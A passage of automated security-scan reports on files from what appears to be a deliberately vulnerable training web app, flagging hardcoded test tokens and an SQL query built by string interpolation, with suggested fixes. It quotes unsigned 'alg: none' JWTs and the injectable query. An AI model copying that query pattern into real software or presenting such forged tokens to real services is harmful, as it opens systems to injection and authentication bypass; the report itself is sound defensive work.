[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 5, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/server/verify.unit.test.ts`
**Scanned at**: 2026-10-11T16:33:31.832223+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 283 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Hardcoded Bearer token detected in source code
```ts
// Line 283
req.headers = { authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn0sImlhdCI6MTUwODYzOTYxMiwiZXhwIjo5OTk5OTk5OTk5fQ.' }
// Line 291
req.headers = { authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQCJ9LCJpYXQiOjE1MDg2Mzk2MTIsImV4cCI6OTk5OTk5OTk5OX0.' }
// Line 308
req.headers = { authorization: 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImVtYWlsIjoicnNhX2xvcmRAanVpY2Utc2gub3AifSwiaWF0IjoxNTgyMjIxNTc1fQ.ycFwtqh4ht4Pq9K5rhiPPY256F9YCTIecd4FHFuSEA...
```
**Suggested fix:**
```ts
// Suggested fix: load tokens from environment variables at runtime
// WRONG:  headers: { Authorization: 'Bearer eyJhbGciO...' }
headers: { Authorization: `Bearer ${process.env.ACCESS_TOKEN}` }
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [IDOR-M-006](https://verify.example-org.internal/?id=IDOR-M-006) | Log Authorization Failures |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-002](https://verify.example-org.internal/?id=HDR-M-002) | No Server Banners |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 283, "message": "Hardcoded Bearer token detected in source code", "fix_snippet": "// Suggested fix: load tokens from environment variables at runtime\n// WRONG:  headers: { Authorization: 'Bearer eyJhbGciO...' }\nheaders: { Authorization: `Bearer ${process.env.ACCESS_TOKEN}` }"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `test/server/preconditionValidation.unit.test.ts`
**Scanned at**: 2026-10-11T16:33:33.342542+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 80 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Potential hardcoded secret detected
```ts
// Line 80
process.env.ALCHEMY_API_KEY = 'test-key'
```
**Suggested fix:**
```ts
# Suggested fix: store secrets in environment variables, never in code
import os
API_KEY = os.environ['API_KEY']        # Python
# const apiKey = process.env.API_KEY   # Node.js
# $apiKey = getenv('API_KEY');          # PHP
# Use Azure Key Vault, HashiCorp Vault, or AWS Secrets Manager in production.
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [IDOR-M-007](https://verify.example-org.internal/?id=IDOR-M-007) | Validate Nested Resource Ownership |
| 🔴 Critical | [HDR-M-002](https://verify.example-org.internal/?id=HDR-M-002) | No Server Banners |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 80, "message": "Potential hardcoded secret detected", "fix_snippet": "# Suggested fix: store secrets in environment variables, never in code\nimport os\nAPI_KEY = os.environ['API_KEY']        # Python\n# const apiKey = process.env.API_KEY   # Node.js\n# $apiKey = getenv('API_KEY');          # PHP\n# Use Azure Key Vault, HashiCorp Vault, or AWS Secrets Manager in production."}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/unionSqlInjectionChallenge_3.ts`
**Scanned at**: 2026-10-11T16:33:41.076391+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 10 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 10
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 10, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", 